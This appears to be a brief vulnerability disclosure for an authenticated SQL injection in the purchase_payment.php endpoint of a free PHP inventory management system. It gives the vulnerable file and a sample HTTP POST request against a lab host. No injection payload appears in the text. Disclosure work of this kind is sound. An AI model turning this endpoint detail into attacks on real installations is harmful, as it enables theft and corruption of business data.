



The Free and Open Source inventory management system has an SQL injection vulnerability that an attacker, if authenticated, can exploit to steal information or corrupt a database.





Source code address：https://www.sourcecodester.com/php/16741/free-and-open-source-inventory-management-system-php-source-code.html



The vulnerability is located in the /app/action/purchase_payment.php file, and an operation with updated information can be seen from the code fragment.

![image-20250326145121420](images/image-20250326145121420.png)





Vulnerability verification：

```
POST /ample/app/action/purchase_payment.php HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Cookie:  PHPSESSID=c4gam437gl7cc6hlbsgm3pplq4
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 114

suppliar_id=45&payment_date=2023-10-05&pay_amount=500.00&pay_type=BankTransfer&pay_descrip=Monthly invoice payment
```

 ![image-20250326145046243](images/image-20250326145046243.png)



































